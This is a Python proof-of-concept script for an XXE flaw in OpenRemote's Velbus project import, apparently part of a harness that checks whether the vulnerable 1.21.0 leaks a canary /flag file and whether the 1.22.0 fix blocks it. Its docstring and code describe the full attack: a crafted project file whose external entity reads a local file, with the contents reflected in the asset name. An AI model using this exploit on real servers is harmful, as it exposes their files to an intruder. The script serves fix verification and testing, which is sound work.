#!/usr/bin/env python3
"""ORIGINAL PoC -- CVE-2026-40882 (OpenRemote XXE in the Velbus asset import).

An authenticated user creates a Velbus TCP agent and POSTs a crafted Velbus
project file to the product asset-import endpoint. The project declares an
external general entity <!ENTITY xxe SYSTEM "file:///flag"> and references it
from a module <Caption>. The Velbus importer parses the file with a plain
DocumentBuilderFactory (no XXE hardening) and uses Caption.getTextContent() as
the imported device's name -- so the file contents are reflected straight back
in the import HTTP response.

  - V0 (1.21.0): reads the flag (asset name contains the /flag contents).
  - V1 (1.22.0): CVE-2026-40882 fix -> createSecureDocumentBuilderFactory sets
                 disallow-doctype-decl -> parse fails -> blocked.

Usage:  original_poc.py <manager_base_url>
        e.g. original_poc.py http://127.0.0.1:18079
Prints a line 'FLAG_READ: <token>' if the canary was exfiltrated, else 'BLOCKED'.
"""
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import orlib

FLAG_MARK = "PCBFLAG:"


def run(base):
    token = orlib.get_token(base)
    agent_id = orlib.create_velbus_agent(base, token, host="collector", port=8000)
    time.sleep(8)  # let the Velbus protocol instance register
    payload = orlib.build_velbus_payload("file:///flag")
    status, assets = orlib.do_import(base, token, agent_id, payload, name="VelbusProject.vlp")
    names = []
    if isinstance(assets, list):
        names = [a.get("asset", {}).get("name", "") for a in assets]
    leaked = [n for n in names if n and n.startswith(FLAG_MARK)]
    print("HTTP", status, "assets", len(names))
    if leaked:
        token_val = leaked[0][len(FLAG_MARK):]
        print("FLAG_READ:", token_val)
        return token_val
    print("BLOCKED (no reflected flag in import response)")
    return None


if __name__ == "__main__":
    run(sys.argv[1] if len(sys.argv) > 1 else os.environ.get("PCB_TARGET_BASE", "http://127.0.0.1:18079"))
